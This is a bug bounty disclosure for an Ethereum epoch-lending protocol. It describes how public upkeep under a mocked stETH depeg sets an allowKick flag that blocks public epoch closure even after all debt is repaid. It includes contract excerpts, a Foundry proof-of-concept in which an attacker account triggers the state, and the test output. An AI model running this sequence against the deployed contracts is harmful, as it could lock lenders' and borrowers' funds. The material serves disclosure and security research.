# Based on deployed contracts

Project: Anonymous epoch lending project (LEND-01)  
Category: Epoch lending  
Severity: Critical author recommendation; conflicting High/potential Critical source descriptions  
Engagement: Bug bounty hunting  
Chain: Ethereum; pinned local mainnet fork with mocked stress input  
Tech stack: Solidity/EVM, Foundry, matched WETH/wstETH lending, Ajna debt, Chainlink feeds, Lido withdrawals, public Automation upkeep  
Evidence: Historical local or fork test excerpts; scope and fixture assumptions are described below  
Remediation: Not independently verified  
Contribution: Research and disclosure case study; exclusive discovery credit is not asserted  
Proof availability: Excerpts and source references; the original harness and dependencies are not distributed.

# The allowKick state suppresses public epoch closure after debt repayment

## Description

After normal epoch setup, a public keeper advances collateral tranches under a stressed redemption rate and enables allowKick. Once the term ends, public close tasks are excluded while allowKick remains true. Even a complete debt bailout does not clear that flag, leaving an open epoch with zero debt and no active auction to reset the state.

The source’s “permanent” wording means the demonstrated ordinary public close paths stay unavailable in the tested terminal state; it does not prove all privileged or auction-based recovery is impossible. The 5% adverse feed move is mocked, not replayed from a historical depeg block. Admin actions occur during initial fixture setup, not in the attack steps. High/Critical eligibility and final platform adjudication remain unresolved.

### Mechanism step by step

#### Step 1 — Advance to the allow-kick state through ordinary upkeep

With sufficient tranche movement, the real task transition sets allowKick=true; the proof does not directly write that flag.

Source: `src/LVLidoVaultUtil.sol:261-268`

```solidity
                if (collateralToAddToPreventLiquidation > 0) {
                    LVLidoVault.avoidLiquidation(collateralToAddToPreventLiquidation);
                    LVLidoVault.setCollateralLenderTraunche(LVLidoVault.collateralLenderTraunche() + tranchesToTrigger);
                    LVLidoVault.setCurrentRedemptionRate(newRedemptionRate);
                }
            } else if (tranchesToTrigger + LVLidoVault.collateralLenderTraunche() >= MAX_TRANCHES) {
                LVLidoVault.setAllowKick(true);
            }
```

#### Step 2 — Exclude close tasks after expiry while the flag remains true

The outer guard requires getAllowKick()==false before even checking whether debt is zero.

Source: `src/LVLidoVaultUtil.sol:173-189`

```solidity
        } else if (
            LVLidoVault.epochStarted() && block.timestamp > (LVLidoVault.epochStart() + LVLidoVault.termDuration())
                && LVLidoVault.getAllowKick() == false
        ) {
            if (debt == 0) {
                return (true, abi.encode(2)); // Auction happened and debt was cleared, queue task ID 2
            } else if (!LVLidoVault.fundsQueued()) {
                // See if Ajna debt is 0 or not
                (uint256 currentDebt,,,) = poolInfoUtils.borrowerInfo(address(LVLidoVault.pool()), address(LVLidoVault));
                if (currentDebt == 0) {
                    upkeepNeeded = true;
                    performData = abi.encode(2); // Task ID 2: Withdraw funds
                    return (upkeepNeeded, performData);
                }
                upkeepNeeded = true;
                performData = abi.encode(1); // Task ID 1: End term and queue funds
                return (upkeepNeeded, performData);
```

#### Step 3 — Repay all debt and test the terminal public paths

The historical assertion clears debt, confirms no active auction, observes public take failing, and verifies the epoch/flag remain active. This is test source, not a new execution.

Source: `test/cre/submission/P1_PermanentAllowKickBrick.t.sol:78-89`

```solidity
        uint256 paid = _repayAllDebt(); assertEq(_debt(), 0, "debt not zero");
        assertEq(VAULT.totalManualRepay(), paid, "manual repay mismatch"); console2.log("step 3: debt after bailout", _debt());

        (uint256 kickTime,,uint256 debtToCover,,,,,,) = LIQ.auctionStatus();
        assertEq(kickTime, 0, "active auction"); assertEq(debtToCover, 0, "auction debt");
        vm.prank(attacker); // public take cannot clear allowKick when no auction is active.
        try LIQ.take(1) { revert("take succeeded"); } catch Error(string memory reason) {
            assertEq(keccak256(bytes(reason)), keccak256(bytes("Auction not ongoing.")), "bad take revert");
        }
        assertTrue(VAULT.getAllowKick(), "allowKick cleared"); assertTrue(VAULT.epochStarted(), "epoch closed");
        assertFalse(UTIL.updateRateNeeded(), "task221 due"); _assertNoPublicUpkeep("after bailout");
        console2.log("step 4: final epochStarted", VAULT.epochStarted()); console2.log("step 4: final allowKick", VAULT.getAllowKick());
```

## Proof of concept

The Foundry test `test_publicAllowKickBrickIsUnrecoverableViaPublicSurface` creates 10 WETH lender capital and 5 wstETH each for the borrower and collateral lender. Owner impersonation initializes the epoch and configuration; a mocked stETH/USD stress then drives the public upkeep path. The historical result reaches tranche 3 and allowKick=true. A full bailout sets debt to zero, but epochStarted and allowKick remain true. This demonstrates the public recovery dead end in that constructed state; it does not establish a naturally occurring production incident.

**Proof limits:** Privileged fixture initialization and mocked market stress; no current production replay.

The excerpts below preserve historical assertions and recorded outcomes; they are not a fresh execution result.

## Relevant test excerpts

Source: `test/cre/submission/P1_PermanentAllowKickBrick.t.sol:57-79`

```solidity
    function test_publicAllowKickBrickIsUnrecoverableViaPublicSurface() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), FORK_BLOCK); // pin deployed state; avoid latest drift.
        _startEpoch();
        assertTrue(VAULT.epochStarted(), "epoch not live"); assertEq(VAULT.collateralLenderTraunche(), 0, "bad tranche");
        assertFalse(VAULT.getAllowKick(), "allowKick true"); assertTrue(_debt() > 0, "debt missing");
        console2.log("step 0: live debt", _debt());

        _mockPrice(95e6, 100e6); // simulate 5% stETH/USD depeg; market input only.
        _expectTask(0); vm.prank(attacker); UTIL.performTask(); // unprivileged public task 0.
        assertEq(VAULT.collateralLenderTraunche(), UTIL.MAX_TRANCHES(), "not max tranche");
        assertFalse(VAULT.getAllowKick(), "task0 set allowKick"); console2.log("step 1: tranche", VAULT.collateralLenderTraunche());

        _expectTask(3); vm.prank(attacker); UTIL.performTask(); // unprivileged public task 3.
        assertTrue(VAULT.getAllowKick(), "task3 failed"); console2.log("step 2: allowKick", VAULT.getAllowKick());

        vm.warp(VAULT.epochStart() + VAULT.termDuration() + 1); // move past 14-day epoch term.
        _clearRateFlagWithPublicFallback(); _mockPrice(100e6, 100e6);
        assertFalse(UTIL.updateRateNeeded(), "task221 due"); assertTrue(VAULT.getAllowKick(), "not gated");
        assertTrue(_task1WithdrawalAmount() > IERC20Like(WSTETH).balanceOf(address(VAULT)), "task1 would not fail");
        _assertNoPublicUpkeep("before bailout");

        uint256 paid = _repayAllDebt(); assertEq(_debt(), 0, "debt not zero");
        assertEq(VAULT.totalManualRepay(), paid, "manual repay mismatch"); console2.log("step 3: debt after bailout", _debt());
```

Source: `submission/P1_minimal_repro.md:25-32`

````text
step 0: live debt 9749920664383561641
step 1: tranche 3
step 2: allowKick true
step 3: rate clear calls 8
step 3: debt after bailout 0
step 4: final epochStarted true
step 4: final allowKick true
```
````
